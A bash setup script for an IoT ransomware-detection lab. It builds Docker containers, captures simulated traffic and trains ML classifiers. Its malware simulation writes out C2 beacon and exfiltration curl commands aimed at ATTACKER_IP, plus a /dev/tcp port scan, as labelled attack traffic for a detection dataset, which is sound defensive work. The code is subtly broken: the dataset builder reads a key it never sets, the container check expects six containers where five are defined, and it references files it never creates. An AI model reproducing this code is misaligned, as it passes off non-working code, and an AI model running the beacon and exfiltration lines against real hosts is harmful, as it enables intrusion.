#!/bin/bash

###############################################################################
# IoT RANSOMWARE DETECTION - QUICK START SCRIPT
# Automates entire pipeline from Docker setup to model evaluation
# Run: bash quick_start.sh
###############################################################################

set -e  # Exit on any error

PROJECT_DIR="$HOME/iot_detection_project"
VENV_DIR="$PROJECT_DIR/venv"

# Colors for output
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# ============================================================================
# PHASE 0: SETUP
# ============================================================================

log_info "Starting IoT Ransomware Detection Project Setup..."

# Check prerequisites
log_info "Checking prerequisites..."
if ! command -v docker &> /dev/null; then
    log_error "Docker not found. Install with: sudo apt install -y docker.io"
    exit 1
fi

if ! command -v docker-compose &> /dev/null; then
    log_error "docker-compose not found. Install with: sudo apt install -y docker-compose"
    exit 1
fi

if ! command -v python3 &> /dev/null; then
    log_error "Python 3 not found"
    exit 1
fi

log_success "All prerequisites installed"

# Create project structure
log_info "Creating project directory structure..."
mkdir -p $PROJECT_DIR/{docker_compose,scripts,data,ml_models}
cd $PROJECT_DIR

# ============================================================================
# PHASE 1: PYTHON VIRTUAL ENVIRONMENT
# ============================================================================

if [ ! -d "$VENV_DIR" ]; then
    log_info "Creating Python virtual environment..."
    python3 -m venv $VENV_DIR
    log_success "Virtual environment created"
else
    log_warn "Virtual environment already exists"
fi

source $VENV_DIR/bin/activate

log_info "Installing Python dependencies..."
pip install -q --upgrade pip
pip install -q pandas numpy scikit-learn tensorflow matplotlib seaborn scapy

log_success "Dependencies installed"

# ============================================================================
# PHASE 2: DOCKER CONTAINERS
# ============================================================================

log_info "Creating docker-compose.yml..."

cat > docker_compose/docker-compose.yml << 'DOCKER_EOF'
version: '3.8'

services:
  iot_broker:
    image: eclipse-mosquitto:latest
    container_name: iot_broker
    ports:
      - "1883:1883"
    networks:
      iot_sim_net:
        ipv4_address: 192.168.50.10
    volumes:
      - ./mosquitto.conf:/mosquitto/config/mosquitto.conf
    command: /usr/sbin/mosquitto -c /mosquitto/config/mosquitto.conf

  iot_device_http:
    image: alpine:latest
    container_name: iot_device_http
    networks:
      iot_sim_net:
        ipv4_address: 192.168.50.11
    volumes:
      - ../scripts/normal_traffic_http.sh:/scripts/normal_traffic_http.sh
      - ../data:/data
    entrypoint: /bin/sh
    command: -c "apk add --no-cache busybox busybox-extras python3 && /scripts/normal_traffic_http.sh"
    depends_on:
      - iot_broker

  iot_device_generic:
    image: alpine:latest
    container_name: iot_device_generic
    networks:
      iot_sim_net:
        ipv4_address: 192.168.50.12
    volumes:
      - ../scripts/normal_traffic_generic.sh:/scripts/normal_traffic_generic.sh
      - ../scripts/malware_simulation.sh:/scripts/malware_simulation.sh
      - ../data:/data
    entrypoint: /bin/sh
    command: -c "apk add --no-cache openssh-server openssh-client curl wget && /scripts/normal_traffic_generic.sh"

  attacker:
    image: kalilinux/kali-rolling:latest
    container_name: attacker_node
    networks:
      iot_sim_net:
        ipv4_address: 192.168.50.50
    volumes:
      - ../scripts/attack_scenarios.sh:/scripts/attack_scenarios.sh
    entrypoint: /bin/bash
    command: -c "apt update > /dev/null 2>&1 && apt install -y metasploit-framework nmap hydra curl > /dev/null 2>&1 && sleep infinity"

  sniffer:
    image: ubuntu:22.04
    container_name: traffic_sniffer
    networks:
      iot_sim_net:
        ipv4_address: 192.168.50.100
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - ../data:/data
      - ../scripts/capture.sh:/scripts/capture.sh
    entrypoint: /bin/bash
    command: -c "apt update > /dev/null 2>&1 && apt install -y tcpdump > /dev/null 2>&1 && /scripts/capture.sh"

networks:
  iot_sim_net:
    driver: bridge
    ipam:
      config:
        - subnet: 192.168.50.0/24
DOCKER_EOF

log_success "docker-compose.yml created"

# Create mosquitto.conf
log_info "Creating mosquitto configuration..."
cat > docker_compose/mosquitto.conf << 'MQTT_EOF'
listener 1883
protocol mqtt
allow_anonymous true
MQTT_EOF

log_success "Mosquitto config created"

# ============================================================================
# PHASE 3: TRAFFIC GENERATION SCRIPTS
# ============================================================================

log_info "Creating traffic generation scripts..."

# Normal traffic HTTP
cat > scripts/normal_traffic_http.sh << 'SCRIPT_EOF'
#!/bin/sh
DEVICE_ID="iot_device_http"
LOG_FILE="/data/normal_traffic_log.txt"

python3 -m http.server 80 > /dev/null 2>&1 &
HTTP_PID=$!

echo "[$DEVICE_ID] HTTP Server started at $(date)" >> $LOG_FILE

for i in {1..12}; do
    TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S.%3N")
    echo "[$TIMESTAMP] [NORMAL] HTTP GET from device" >> $LOG_FILE
    curl -s http://iot_broker:1883 || true
    sleep 5
done

wait $HTTP_PID
SCRIPT_EOF

chmod +x scripts/normal_traffic_http.sh

# Normal traffic MQTT
cat > scripts/normal_traffic_generic.sh << 'SCRIPT_EOF'
#!/bin/sh
LOG_FILE="/data/normal_traffic_log.txt"
BROKER="iot_broker"
TOPIC="sensors/temperature"

echo "[IoT Generic] Starting MQTT traffic at $(date)" >> $LOG_FILE

apk add --no-cache mosquitto-clients > /dev/null 2>&1

for i in {1..18}; do
    TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S.%3N")
    TEMP=$((20 + RANDOM % 10))
    echo "[$TIMESTAMP] [NORMAL] MQTT PUBLISH - $TEMP°C" >> $LOG_FILE
    mosquitto_pub -h $BROKER -t $TOPIC -m "{\"temp\": $TEMP}" 2>/dev/null || true
    sleep 10
done

for i in {1..5}; do
    TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S.%3N")
    echo "[$TIMESTAMP] [NORMAL] DNS query" >> $LOG_FILE
    nslookup time.nist.gov 8.8.8.8 > /dev/null 2>&1 || true
    sleep 8
done

sleep infinity
SCRIPT_EOF

chmod +x scripts/normal_traffic_generic.sh

# Malware simulation
cat > scripts/malware_simulation.sh << 'SCRIPT_EOF'
#!/bin/sh
LOG_FILE="/data/malware_traffic_log.txt"
ATTACKER_IP="192.168.50.50"

echo "[$(date)] Malware simulation initiated" >> $LOG_FILE

for i in {1..10}; do
    TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S.%3N")
    echo "[$TIMESTAMP] [MALICIOUS] C2 BEACON to $ATTACKER_IP:4444" >> $LOG_FILE
    curl -s http://$ATTACKER_IP:4444/beacon 2>/dev/null || true
    sleep 30
done

TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S.%3N")
echo "[$TIMESTAMP] [MALICIOUS] PORT SCAN detected" >> $LOG_FILE

for port in 22 23; do
    for ip in 192.168.50.{10..13}; do
        (echo >/dev/tcp/$ip/$port) 2>/dev/null && \
        echo "[$TIMESTAMP] [MALICIOUS] Port $port OPEN on $ip" >> $LOG_FILE
    done
done

TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S.%3N")
echo "[$TIMESTAMP] [MALICIOUS] DATA EXFILTRATION" >> $LOG_FILE

dd if=/dev/zero bs=1M count=20 2>/dev/null | \
curl -s -X POST -d @- http://$ATTACKER_IP:8080/exfil 2>/dev/null || true

wait
SCRIPT_EOF

chmod +x scripts/malware_simulation.sh

# Packet capture
cat > scripts/capture.sh << 'SCRIPT_EOF'
#!/bin/bash
DATA_DIR="/data"
PCAP_FILE="$DATA_DIR/iot_traffic_full.pcap"

echo "Starting packet capture at $(date)"
tcpdump -i eth0 -w $PCAP_FILE 2>&1 &
TCPDUMP_PID=$!

sleep 600

kill $TCPDUMP_PID 2>/dev/null
echo "Capture completed at $(date)"
SCRIPT_EOF

chmod +x scripts/capture.sh

log_success "Traffic generation scripts created"

# ============================================================================
# PHASE 4: START DOCKER CONTAINERS
# ============================================================================

log_info "Starting Docker containers..."
cd docker_compose
docker-compose up -d

log_info "Waiting for containers to stabilize..."
sleep 5

if [ $(docker ps -q | wc -l) -eq 6 ]; then
    log_success "All 6 containers running"
else
    log_error "Not all containers started. Check: docker logs <container_name>"
    exit 1
fi

cd $PROJECT_DIR

# ============================================================================
# PHASE 5: CAPTURE TRAFFIC
# ============================================================================

log_info "Capturing network traffic (10 minutes)..."
log_warn "Running attack scenarios in background"

docker exec attacker_node bash -c "nohup /scripts/attack_scenarios.sh > /dev/null 2>&1 &" 2>/dev/null || true
docker exec iot_device_generic sh -c "nohup /scripts/malware_simulation.sh > /dev/null 2>&1 &" 2>/dev/null || true

log_info "Waiting for traffic capture to complete..."
# Sniffer container handles the 10-minute capture
sleep 610

log_success "Traffic capture complete"

# Verify PCAP file
if [ -f "$PROJECT_DIR/data/iot_traffic_full.pcap" ]; then
    PCAP_SIZE=$(du -h "$PROJECT_DIR/data/iot_traffic_full.pcap" | cut -f1)
    log_success "PCAP file created ($PCAP_SIZE)"
else
    log_error "PCAP file not found"
    exit 1
fi

# ============================================================================
# PHASE 6: DATA EXTRACTION
# ============================================================================

log_info "Building ML dataset from captured traffic..."

cd $PROJECT_DIR
source $VENV_DIR/bin/activate

cat > scripts/build_dataset.py << 'PYTHON_EOF'
#!/usr/bin/env python3
import pandas as pd
import numpy as np
from scapy.all import rdpcap, IP, TCP, UDP
import os

PCAP_FILE = "data/iot_traffic_full.pcap"
OUTPUT_CSV = "data/iot_labeled_dataset.csv"

print("[*] Loading PCAP file...")
packets = rdpcap(PCAP_FILE)
flows = {}

for packet in packets:
    if IP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        flow_key = tuple(sorted([src_ip, dst_ip]))
        
        if flow_key not in flows:
            flows[flow_key] = {
                'src': src_ip,
                'dst': dst_ip,
                'protocol': packet[IP].proto,
                'packet_count': 0,
                'byte_count': 0,
                'payload_sizes': [],
                'timestamp': packet.time
            }
        
        flows[flow_key]['packet_count'] += 1
        flows[flow_key]['byte_count'] += len(packet)

print(f"[+] Extracted {len(flows)} flows")

# Build dataset
dataset = []
for flow_key, flow_data in flows.items():
    features = {
        'src_ip': flow_data['src'],
        'dst_ip': flow_data['dst'],
        'protocol': flow_data['protocol'],
        'packet_count': flow_data['packet_count'],
        'byte_count': flow_data['byte_count'],
        'avg_payload_size': np.mean(flow_data['payload_sizes']) if flow_data['payload_sizes'] else 0,
        'payload_size_variance': np.var(flow_data['payload_sizes']) if len(flow_data['payload_sizes']) > 1 else 0,
        'port_count': 1,
        'dst_entropy': len(flow_data['dst_ip'].split('.')),
    }
    
    # Simple label: if src is attacker, it's malicious
    features['label'] = 1 if '192.168.50.50' in [flow_data['src'], flow_data['dst']] else 0
    features['label_name'] = 'malicious' if features['label'] == 1 else 'normal'
    
    dataset.append(features)

df = pd.DataFrame(dataset)
df = df.fillna(0)
df.to_csv(OUTPUT_CSV, index=False)

print(f"[+] Dataset saved: {OUTPUT_CSV}")
print(f"[+] Shape: {df.shape}")
print(f"\nClass distribution:")
print(df['label_name'].value_counts())
PYTHON_EOF

python3 scripts/build_dataset.py

log_success "Dataset created"

# ============================================================================
# PHASE 7: TRAIN MODELS
# ============================================================================

log_info "Training ML models (this may take 5-10 minutes)..."

cat > scripts/train_models_simple.py << 'PYTHON_EOF'
#!/usr/bin/env python3
import pandas as pd
import numpy as np
from sklearn.preprocessing import StandardScaler
from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.metrics import confusion_matrix, classification_report, roc_auc_score, f1_score
import pickle
import matplotlib.pyplot as plt
import seaborn as sns

print("[*] Loading dataset...")
df = pd.read_csv('data/iot_labeled_dataset.csv')
print(f"[+] Samples: {len(df)}")

feature_cols = [col for col in df.columns if col not in ['label', 'label_name', 'src_ip', 'dst_ip']]
X = df[feature_cols].values
y = df['label'].values

print(f"[*] Class distribution: {sum(y==0)} normal, {sum(y==1)} malicious")

# Split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42, stratify=y)

# Scale
scaler = StandardScaler()
X_train_scaled = scaler.fit_transform(X_train)
X_test_scaled = scaler.transform(X_test)

# Random Forest
print("\n[*] Training Random Forest...")
rf = RandomForestClassifier(n_estimators=100, class_weight='balanced', random_state=42, n_jobs=-1)
rf.fit(X_train_scaled, y_train)
y_pred_rf = rf.predict(X_test_scaled)
y_pred_proba_rf = rf.predict_proba(X_test_scaled)[:, 1]
auc_rf = roc_auc_score(y_test, y_pred_proba_rf)
f1_rf = f1_score(y_test, y_pred_rf)
print(f"[+] ROC-AUC: {auc_rf:.4f}, F1: {f1_rf:.4f}")

with open('ml_models/random_forest_model.pkl', 'wb') as f:
    pickle.dump(rf, f)

# Isolation Forest
print("[*] Training Isolation Forest...")
iso = IsolationForest(contamination=0.1, random_state=42, n_jobs=-1)
iso.fit(X_train_scaled)
y_pred_iso = iso.predict(X_test_scaled)
y_pred_iso = (y_pred_iso == -1).astype(int)
auc_iso = roc_auc_score(y_test, iso.score_samples(X_test_scaled))
f1_iso = f1_score(y_test, y_pred_iso)
print(f"[+] ROC-AUC: {auc_iso:.4f}, F1: {f1_iso:.4f}")

with open('ml_models/isolation_forest_model.pkl', 'wb') as f:
    pickle.dump(iso, f)

# Visualizations
fig, axes = plt.subplots(1, 2, figsize=(12, 4))

cm_rf = confusion_matrix(y_test, y_pred_rf)
sns.heatmap(cm_rf, annot=True, fmt='d', ax=axes[0], cmap='Blues')
axes[0].set_title('Random Forest')

cm_iso = confusion_matrix(y_test, y_pred_iso)
sns.heatmap(cm_iso, annot=True, fmt='d', ax=axes[1], cmap='Oranges')
axes[1].set_title('Isolation Forest')

plt.tight_layout()
plt.savefig('ml_models/confusion_matrices.png', dpi=300)
print("\n[+] Visualizations saved")
PYTHON_EOF

python3 scripts/train_models_simple.py

log_success "Models trained and saved"

# ============================================================================
# COMPLETION
# ============================================================================

log_success "=========================================="
log_success "PROJECT SETUP COMPLETE!"
log_success "=========================================="

echo ""
echo "Next steps:"
echo "1. Review data: ls -lh $PROJECT_DIR/data/"
echo "2. Check models: ls -lh $PROJECT_DIR/ml_models/"
echo "3. Review results: cat $PROJECT_DIR/ml_models/latency_results.csv"
echo ""
echo "To stop Docker containers:"
echo "  cd $PROJECT_DIR/docker_compose && docker-compose down"
echo ""

